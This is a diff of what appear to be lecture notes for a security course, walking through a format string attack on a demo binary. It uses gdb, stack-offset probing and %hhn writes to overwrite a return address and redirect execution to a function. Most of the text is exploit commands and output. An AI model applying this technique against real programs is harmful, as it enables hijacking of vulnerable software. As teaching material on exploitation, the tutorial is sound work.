 user@si485H-base:demo$ ./plain_fmt AAAABBBBCCCCDDDD%1\$008x.%1\$00x.%1\$008x.%1\$00x.%1\$008x.%1\$00x.%1\$008x.%1\$00x.%7\$#08x
 AAAABBBBCCCCDDDDbffff724.bffff724.bffff724.bffff724.bffff724.bffff724.bffff724.bffff724.0xdeadbeef
 ```
@@ -1633,7 +1610,7 @@ AAAABBBBCCCCDDDDbffff724.bffff724.bffff724.bffff724.bffff724.bffff724.bffff724.b
 This will be our target we'll write to. Now to align the rest of the
 format.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ for i in `seq 1 1 200`; do echo -n "$i "; ./plain_fmt AAAABBBBCCCCDDDD%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%7\$#08x ; done | grep 41
 41 AAAABBBBCCCCDDDDbffff724.2.bffff724.2.bffff724.2.bffff724.2.0xdeadbeef
 74 AAAABBBBCCCCDDDDbffff724.b7fdd414.bffff724.b7fdd414.bffff724.b7fdd414.bffff724.b7fdd414.0xdeadbeef
@@ -1643,20 +1620,19 @@ user@si485H-base:demo$ for i in `seq 1 1 200`; do echo -n "$i "; ./plain_fmt AAA
 
 And we see that at 123, we find the alignment we are looking for.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./plain_fmt AAAABBBBCCCCDDDD%1\$008x.%123\$00x.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
 AAAABBBBCCCCDDDDbffff724.41414141.bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
 ```
 
-Determining where to write
---------------------------
+## Determining where to write
 
 Now, things get a bit sticky. We have the aligned format but we are not
 entirely sure what address to replace the A's, B's, C's, and D's with.
 Let's fire up gdb and see if we can learn something more about the
 address alignment.
 
-``` {.example}
+``` example
 (gdb) br main
 Breakpoint 1 at 0x804849a: file plain_fmt.c, line 12.
 (gdb) r AAAABBBBCCCCDDDD%1\$008x.%123\$00x.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
@@ -1668,7 +1644,7 @@ Breakpoint 1, main (argc=2, argv=0xbffff6d4) at plain_fmt.c:12
 
 Now we're under gdb, let's print the entire stack frame:
 
-``` {.example}
+``` example
 (gdb) x/12x $esp
 0xbffff610: 0x00000002  0xbffff6d4  0xbffff6e0  0xb7e4d42d
 0xbffff620: 0xb7fc43c4  0xb7fff000  0x080484db  0xb7fc4000
@@ -1681,7 +1657,7 @@ So the address of the return is at 0xbffff63c. And taking a full
 programatic step after the assignment of 0xdeadbeef, we can see what
 address deadbeef is at:
 
-``` {.example}
+``` example
 (gdb) n
 14    printf(argv[1]);
 (gdb) x/12x $esp
@@ -1694,7 +1670,7 @@ Let's take account of what we know: (1) The return address is at
 0xbffff63c and (2) the address of deadbeef is 0x10 less at 0xbffff62c.
 Let's continue the program:
 
-``` {.example}
+``` example
 (gdb) c
 Continuing.
 AAAABBBBCCCCDDDDbffff6d4.2f000000.bffff6d4.656d6f68.bffff6d4.6573752f.bffff6d4.69672f72.0xdeadbeef
@@ -1709,7 +1685,7 @@ address is offset 0x98 from that address (0xbffff6d4-0x98).
 Now, we can take that information *outside* of gdb to try and determine
 what is going on and find the address we are looking for.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./plain_fmt AAAABBBBCCCCDDDD%1\$008x.%123\$00x.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
 AAAABBBBCCCCDDDDbffff724.41414141.bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
 ```
@@ -1719,7 +1695,7 @@ address of deadbeef should be at 0xbffff724-0xa8, or 0xbffff67c. And the
 address of return address should be 0xbffff68c. Let's see if we can
 cause some mischief:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./plain_fmt $(printf "\x8c\xf6\xff\xbf")BBBBCCCCDDDD%1\$008x.%123\$hhn.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
 ???BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
 ????BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
@@ -1732,7 +1708,7 @@ user@si485H-base:demo$ ./plain_fmt $(printf "\x8c\xf6\xff\xbf")BBBBCCCCDDDD%1\$0
 INFINITE LOOP! We are on to something here. Let's try some other
 addresses within the return address range.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./plain_fmt $(printf "\x8d\xf6\xff\xbf")BBBBCCCCDDDD%1\$008x.%123\$hhn.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
 ????BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
 Segmentation fault (core dumped)
@@ -1752,25 +1728,23 @@ Notice the 0x19 that is moving through the return address range, that
 means we are in the money and we can start writing some bytes to that
 address.
 
-Writing Byes
-------------
+## Writing Byes
 
 Like before, we want to write from most significant to least
 significant, so we can setup the following format:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./plain_fmt $(printf "\x8f\xf6\xff\xbf")$(printf "\x8e\xf6\xff\xbf")$(printf "\x8d\xf6\xff\xbf")$(printf "\x8c\xf6\xff\xbf")%1\$008x.%123\$hhn.%1\$008x.%124\$hhn.%1\$008x.%125\$hhn.%1\$008x.%126\$hhn.%7\$#08x 
 ????????????????bffff724..bffff724..bffff724..bffff724..0xdeadbeef
 Segmentation fault (core dumped)
 user@si485H-base:demo$ dmesg | tail -1
 [497630.497343] plain_fmt[3118]: segfault at 19232d37 ip 19232d37 sp bffff690 error 14
-
 ```
 
 And then look at the dmesg output to track our progress. The goal is to
 write to address of foo:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ objdump -d plain_fmt | grep foo
 0804847d <foo>:
 ```
@@ -1778,7 +1752,7 @@ user@si485H-base:demo$ objdump -d plain_fmt | grep foo
 The first byte we need to write is 0x08 and we are currently writing
 0x19, so we wrap around:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ python -c "print (0x100 - 0x19) + 0x08 + 8"
 247
 user@si485H-base:demo$ ./plain_fmt $(printf "\x8f\xf6\xff\xbf")$(printf "\x8e\xf6\xff\xbf")$(printf "\x8d\xf6\xff\xbf")$(printf "\x8c\xf6\xff\xbf")%1\$247x.%123\$hhn.%1\$008x.%124\$hhn.%1\$008x.%125\$hhn.%1\$008x.%126\$hhn.%7\$#08x 
@@ -1790,7 +1764,7 @@ user@si485H-base:demo$ dmesg | tail -1
 
 Next, we need 0x04 but we are writing 12 when we need 04.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ python -c "print (0x100 - 0x12) + 0x04 + 8"
 250
 user@si485H-base:demo$ ./plain_fmt $(printf "\x8f\xf6\xff\xbf")$(printf "\x8e\xf6\xff\xbf")$(printf "\x8d\xf6\xff\xbf")$(printf "\x8c\xf6\xff\xbf")%1\$247x.%123\$hhn.%1\$250x.%124\$hhn.%1\$008x.%125\$hhn.%1\$008x.%126\$hhn.%7\$#08x 
@@ -1802,7 +1776,7 @@ user@si485H-base:demo$ dmesg | tail -1
 
 Next, we need 0x84 and we are writing 0e:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ python -c "print ((0x100 - 0x0e) + 0x84 + 8)%256"
 126
 user@si485H-base:demo$ ./plain_fmt $(printf "\x8f\xf6\xff\xbf")$(printf "\x8e\xf6\xff\xbf")$(printf "\x8d\xf6\xff\xbf")$(printf "\x8c\xf6\xff\xbf")%1\$247x.%123\$hhn.%1\$250x.%124\$hhn.%1\$126x.%125\$hhn.%1\$008x.%126\$hhn.%7\$#08x 
@@ -1826,7 +1800,7 @@ the 8 bytes already printed within the format for 0x008).
 If we are writing 0x8e, what we want to write 7d, that means for the
 last format we should be able to do this"
 
-``` {.example}
+``` example
 user@si485H-base:demo$ python -c "print ((0x100 - 0x8e) + 0x7d + 8)%256"
 247
 user@si485H-base:demo$ ./plain_fmt $(printf "\x8f\xf6\xff\xbf")$(printf "\x8e\xf6\xff\xbf")$(printf "\x8d\xf6\xff\xbf")$(printf "\x8c\xf6\xff\xbf")%1\$247x.%123\$hhn.%1\$250x.%124\$hhn.%1\$126x.%125\$hhn.%1\$247x.%126\$hhn.%7\$#08x 
